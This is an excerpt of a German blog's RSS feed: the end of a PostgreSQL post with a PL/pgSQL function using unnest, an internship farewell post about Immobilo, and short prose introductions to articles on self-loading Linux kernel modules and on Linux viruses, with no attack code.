</span></code></pre></div><p>I hope you have noticed the <code>anyarray</code> which is given as a parameter to the function. So you can use <code>unnest</code> for every type of array. That&rsquo;s the great point when using polymorphic functions: You have some kind of generic function and you can use it for all arrays. Well having this function implemented, we can now modify <code>get_employees</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql"><span style="color:#6ab825;font-weight:bold">CREATE</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">or</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">REPLACE</span><span style="color:#666"> </span>FUNCTION<span style="color:#666"> </span><span style="color:#447fcf">get_employee</span>()<span style="color:#666">
</span><span style="color:#666">   </span>RETURNS<span style="color:#666"> </span>SETOF<span style="color:#666"> </span>t_employee<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">AS</span><span style="color:#666">
</span><span style="color:#666"></span><span style="color:#a61717;background-color:#e3d2d2">$</span>BODY<span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#666">
</span><span style="color:#666">
</span><span style="color:#666"></span><span style="color:#6ab825;font-weight:bold">DECLARE</span><span style="color:#666">
</span><span style="color:#666">   </span>l_row<span style="color:#666"> </span>t_employee;<span style="color:#666">
</span><span style="color:#666">   </span>l_array<span style="color:#666"> </span>t_employee[];<span style="color:#666">
</span><span style="color:#666">
</span><span style="color:#666"></span>BEGIN<span style="color:#666">
</span><span style="color:#666">
</span><span style="color:#666">   </span><span style="color:#999;font-style:italic">-- Loop throught rows
</span><span style="color:#999;font-style:italic"></span><span style="color:#666">   </span><span style="color:#6ab825;font-weight:bold">FOR</span><span style="color:#666"> </span>l_row<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">IN</span><span style="color:#666">
</span><span style="color:#666">      </span><span style="color:#6ab825;font-weight:bold">SELECT</span><span style="color:#666"> </span>*<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">FROM</span><span style="color:#666"> </span>t_employee<span style="color:#666">
</span><span style="color:#666">   </span><span style="color:#6ab825;font-weight:bold">LOOP</span><span style="color:#666">
</span><span style="color:#666">      </span><span style="color:#999;font-style:italic">-- Put all data into array
</span><span style="color:#999;font-style:italic"></span><span style="color:#666">      </span><span style="color:#6ab825;font-weight:bold">SELECT</span><span style="color:#666"> </span><span style="color:#447fcf">array_append</span>(l_array,l_row)<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">INTO</span><span style="color:#666"> </span>l_array;<span style="color:#666">
</span><span style="color:#666">   </span>END<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">LOOP</span>;<span style="color:#666">
</span><span style="color:#666">
</span><span style="color:#666">   </span><span style="color:#999;font-style:italic">-- ARRAY -&amp;gt; SETOF
</span><span style="color:#999;font-style:italic"></span><span style="color:#666">   </span><span style="color:#6ab825;font-weight:bold">FOR</span><span style="color:#666"> </span>l_row<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">IN</span><span style="color:#666">
</span><span style="color:#666">      </span><span style="color:#6ab825;font-weight:bold">SELECT</span><span style="color:#666"> </span>*<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">FROM</span><span style="color:#666"> </span><span style="color:#447fcf">unnest</span>(l_array)<span style="color:#666">
</span><span style="color:#666">   </span><span style="color:#6ab825;font-weight:bold">LOOP</span><span style="color:#666">
</span><span style="color:#666">      </span><span style="color:#6ab825;font-weight:bold">return</span><span style="color:#666"> </span>next<span style="color:#666"> </span>l_row;<span style="color:#666">
</span><span style="color:#666">   </span>END<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">LOOP</span>;<span style="color:#666"> 
</span><span style="color:#666"></span>END;<span style="color:#666">
</span><span style="color:#666"></span><span style="color:#a61717;background-color:#e3d2d2">$</span>BODY<span style="color:#a61717;background-color:#e3d2d2">$</span><span style="color:#666">
</span><span style="color:#666">   </span>LANGUAGE<span style="color:#666"> </span><span style="color:#ed9d13">&#39;plpgsql&#39;</span>;<span style="color:#666">
</span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Bye Bye Immobilo!</title>
      <link>https://blog.dornea.nu/2009/03/18/bye-bye-immobilo/</link>
      <pubDate>Wed, 18 Mar 2009 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2009/03/18/bye-bye-immobilo/</guid>
      <content:encoded><![CDATA[<p>Wow! So schnell kann die Zeit vergehen&hellip;Vor ungefÃ¤hr 5 Monaten wurde ein gewisser Victor D. in die BÃ¼rorÃ¤ume der Firma Golden Immobilien GmbH eingeladen. Grund dafÃ¼r war ein anstehendes VorstellungsgesprÃ¤ch. Damals wusste ich noch nicht, welche Herausforderungen mich im Laufe des Praktikums erwarten werden und welch Bereicherung meines Fachwissens noch bevorstand.</p>
<h2 id="aufgaben">Aufgaben</h2>
<p>Die richtige Bezeichnung meiner Stelle lautete <strong>Datenbank-Entwickler</strong>. Zu meinen Aufgabenbereichen gehÃ¶rte Ã¼berwiegend die Entwicklung neuer (Datenbank)-Funktionen/FunktionalitÃ¤ten fÃ¼r die Immobilien Suchmaschine <a href="http://immobilo.de">immobilo.de</a>. Ich gehe davon aus, dass vielen von euch die eben genannte Suchmaschine unbekannt ist und an dieser Stelle ein gewisser AufklÃ¤rungsbedarf besteht. &amp;Immobilo ist Deutschlands erste und schnellstwachsende Immobilien Suchmaschine und bietet deutschlandweit <a href="http://www.immobilo.de/wohnung" title="Landingpage Wohnung">Wohnungen</a> , <a href="http://www.immobilo.de/haus" title="Landingpage Haus">HÃ¤user</a> und <a href="http://www.immobilo.de/wg" title="Landingpage WG">WGs</a> aus einer Vielzahl von Quellen in einer einzigen Suche. Immobilo ist Partner der groÃŸen Immobilien-, Kleinanzeigen- und Zeitungsportale und indiziert deutlich Ã¼ber 1 Million Objekte. Mit Hilfe einer interaktiven Karten, Umgebungsdaten, Mietpreis-Informationen und einer schnellen und intuitiven Suche will immobilo das beste Produkt am Markt bieten (Quelle: <a href="http://immobilo.de">http://immobilo.de</a>, 18.03.2009)</p>
<p>Nun ja.. Die offizielle Beschreibung sollte genÃ¼gen! (Bitte wertet diesen Artikel nicht als Schleichwerbung ab! Die Suchmaschine hat Einiges zu bieten und ist vom puncto Usibility her den anderen Suchmaschinen Ã¼berlegener. Bestes Beispiel dafÃ¼r ist die einfache Suchfunktion, die mit einem Minimum an Clicks/Einstellungen auskommt - Stadt/Postleitzahl eingeben und schon hat man die gewÃ¼nschten Ergebnisse.)Â  Ich durfte wÃ¤hrend meines Praktikums am Aufbau der Suchmaschine (immobilo.de ist ein Startup-Unternehmen) beteiligt sein und konnte somit auch einen tiefen Einblick in das Produktmanagment werfen. Obwohl ich eher fÃ¼r den Backend-Bereich zustÃ¤ndig war, hatte ich auch sehr oft mit Frontend-Geschichten zu tun. Das half einem einen besseren Ãœberblick Ã¼ber das ganze Produkt zu haben und zu verstehen, wie es wirklich funktionierte. Das Spannendste am Praktikum war wohl der Umgang mit all den Datenbank-Strukturen sowie deren Pflege. Zu erfahren, dass man mit PostgreSQL auch Funktionen -wohlgemerkt verschiedener Typen (Perl, C etc.) schreiben kann, das war fÃ¼r mich das Highlight. Nur so konnte meine Vorliebe zu PostgreSQL immer mehr wachsen.</p>
<h2 id="danke">Danke!</h2>
<p>Das dynamische Erstellen von SQL-Abfragen (dynamisches SQL) ist auch ein spannendes Thema - die KÃ¶nigsdisziplin, wie Henning das sagen wÃ¼rde :). Polymorphe Funktionen sind mit PostgreSQL ebenfalls mÃ¶glich. Ich kÃ¶nnte noch weitere geilen Features aufzÃ¤hlen, aber die Zeit dazu hab ich leider nicht. Vielleicht folgt demnÃ¤chst ein Artikel von mir Ã¼ber Funktionen in PostgreSQL. Ich habe die Zeit sehr genossen, vor allem deswegen, weil mein Durst nach immer mehr Wissen durch die vielfÃ¤ltigen Aufgaben gestillt werden konnte. Ich danke ImmobiloÂ  (vor allem Henning) fÃ¼r die investierte Zeit und hoffe, dass ich stets deren Erwartungen erfÃ¼llen konnte. Die Zeit bei Immobilo hat mir sehr geholfen, mich weiterzuentwickeln und meine WissenslÃ¼cken zu schlieÃŸen. Hehe.. Wenn ich jetzt zurÃ¼ckdenke, fÃ¤llt mir ein, dass ich bei meinem VorstellungsgesprÃ¤ch dasselbe gesagt hatte: <em>Ich habe auch LÃ¼cken. Ich kenne sie sehr gut und ich mÃ¶chte sie wÃ¤hrend des Praktikums auch gerne schlieÃŸen!</em>Â </p>
<h2 id="zitate">Zitate</h2>
<p>Und als Letztes folgen ein paar Zitate aus der Immobilo-Zeit, die immer wieder fÃ¼r gute Stimmung gesorgt haben:</p>
<blockquote>
<p>&ldquo;Ich wÃ¼rde euch nur langweilen, wenn ich das erzÃ¤hlen mÃ¼sste*** (by Me) &quot;</p>
</blockquote>
<blockquote>
<p>&ldquo;Bau mal schÃ¶n den A2 in den Geo-Coder des Such-Widgets ein, damit die Bread-Crumbs im Formular unserer Blog-Seite funktionieren ohne dass das CLV eingeschrÃ¤nkt wird! Wir wollen ja nicht den Server abschieÃŸen!!!&quot;(by SÃ¼leyman !</p>
</blockquote>
<blockquote>
<p>&ldquo;StÃ¶r mich bitte nicht! Ich bin im Flow!&rdquo;</p>
</blockquote>
<blockquote>
<p>&ldquo;Also ich bin in der Marketingabteilung mit [&hellip;] beschÃ¤ftigt. Ansonsten: Rumgammeln und so..&rdquo;&rdquo; (by SÃ¼leyman)</p>
</blockquote>
<blockquote>
<p>&ldquo;Ich bin einer der 4 IT-Atzen hier aka Nerds!&rdquo;&rdquo; (by Me) Â </p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>Mod2Exec - Execute modules </title>
      <link>https://blog.dornea.nu/2008/11/26/mod2exec-execute-modules/</link>
      <pubDate>Wed, 26 Nov 2008 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2008/11/26/mod2exec-execute-modules/</guid>
      <content:encoded><![CDATA[<h2 id="einleitung">Einleitung</h2>
<p>Wir leben in einer Zeit, in der Dynamik sowie FlexibilitÃ¤t eine groÃŸe Rolle spielen. Wir alle besitzen bestimmte FÃ¤higkeiten, die in bestimmten Situationen zum Einsatz kommen kÃ¶nnen. Das heiÃŸt, der Mensch braucht diese nur zur richtigen Zeit â€žaufzurufenâ€œ. Genauso soll ein Kernel, das HerzstÃ¼ck eines Betriebssystems, auch funktionieren: Die aktuelle<br>
Systemkonfiguration wird Ã¼berprÃ¼ft und Module werden hochgeladen. Damit werden dem Kernel Schnittstellen zur VerfÃ¼gung gestellt, die zur Steuerung der Hardware etc. dienen. Das statische Kompilieren von Modulen in den Kernel erfreut sich heutzutage keiner groÃŸen Beliebtheit, da Prozessorleistung und Ressourcen darunter leiden. AuÃŸerdem muss der Kernel nicht jedes Mal neu â€žgebackenâ€œ werden, wenn man zu der aktuellen Kernel-Konfiguration Features hinzufÃ¼gen/deaktivieren mÃ¶chte.</p>
<p>Dieser Artikel befasst sich mit einer neuen Technik, die dazu verwendet wird, aus Modulen ausfÃ¼hrbare Dateien zu erzeugen, die die FÃ¤higkeit besitzen, sich selbst in den Kernel<br>
hochzuladen. Dabei muss man tief in die Arbeitsweise jener Dateien, die am Prozess des Hochladens beteiligt sind, blicken, sowie die unterschiedlichen Typen und Strukturen des<br>
BinÃ¤rformats ELF (Executable and Linking Format) genau untersuchen. Darauf wird jedoch an einer anderen Stelle im Artikel Bezug genommen.</p>
<p>Viel SpaÃŸ beim Lesen!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Viral Infections on Linux</title>
      <link>https://blog.dornea.nu/2008/11/26/viral-infections-on-linux/</link>
      <pubDate>Wed, 26 Nov 2008 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2008/11/26/viral-infections-on-linux/</guid>
      <content:encoded><![CDATA[<h2 id="einleitung">Einleitung</h2>
<p>Wir leben in einem digitalen Zeitalter, in dem sich Technologien rasch weiterentwickeln und deren PrÃ¤senz fÃ¼r uns Menschen eine immer grÃ¶ÃŸer werdende Rolle spielt. Gleichzeitig erfahren wir eine Zunahme der Computer-KriminalitÃ¤t, geprÃ¤gt von mafiÃ¶sen Strukturen, die sich zum Ziel gesetzt haben, Informationen im Eigeninteresse zu sammeln.</p>
<p>Die Wichtigkeit dieser Informationen variiert je nach Art des Angriffs und reicht von der IP-Adresse des Nutzers bis zur Kreditkarten- oder Versicherungsnummer. Die dabei verwendeten<br>
Methoden erfordern ein Wissen Ã¼ber die Struktur der einzelnen Systeme sowie deren SicherheitslÃ¼cken. Es ist ein stÃ¤ndiges Wettrennen zwischen den Firmen, die ihre Produkte vor<br>
Angreifern mittels Sicherheitsupdates schÃ¼tzen wollen und den bÃ¶sen Hackern, die stÃ¤ndig nach neuen Bugs (SicherheitslÃ¼cken) suchen.</p>
<p>Diese Bugs stellen eine sehr groÃŸe Gefahr fÃ¼r die Nutzer dar, da sie das ganze System schwÃ¤chen. Dies kann auf unterschiedlicher Art und Weise als versteckte HintertÃ¼r ausgenutzt<br>
werden. Somit stellt die HintertÃ¼r eine offene Kommunikationsschnittstelle zwischen dem Angreifer und seinem Opfer dar. Dessen AktivitÃ¤ten und wichtige Daten kÃ¶nnen ohne sein<br>
Wissen ausspioniert und dem Angreifer Ã¼bermittelt werden. So eine existierende HintertÃ¼r ist jedoch nicht notwendig dafÃ¼r, dass der Angriff Ã¼berhaupt stattfinden kann. Das System kann dazu gebracht werden, solche TÃ¼ren zu Ã¶ffnen und den Nutzer verwundbar zu machen. Die Effizienz des Angriffs hÃ¤ngt davon ab, wie tief man in das Systeminnere eingreift und welche Ãœberlebensdauer eine derartige HintertÃ¼r besitzt.</p>
<p>In den folgenden Kapiteln werde ich auf die wichtigsten Vertreter dieser Angriffsmethode eingehen. Es handelt sich um die Computer-Viren, die auf den heutzutage viel komplexeren Angriffsmethoden basieren. Ich werde zunÃ¤chst den Aufbau solch eines Virus beschreiben und versuchen zu erklÃ¤ren, warum die Implementation eines Virus eng mit der zu infizierenden Plattform verknÃ¼pft ist.</p>
<p><a href="http://dl.dornea.nu/pdf/2007/Facharbeit-Virale_Infektionen_von_Victor_Dorneanu.pdf">Facharbeit - Virale Infektionen</a></p>
<p>Viel SpaÃŸ beim Lesen!</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
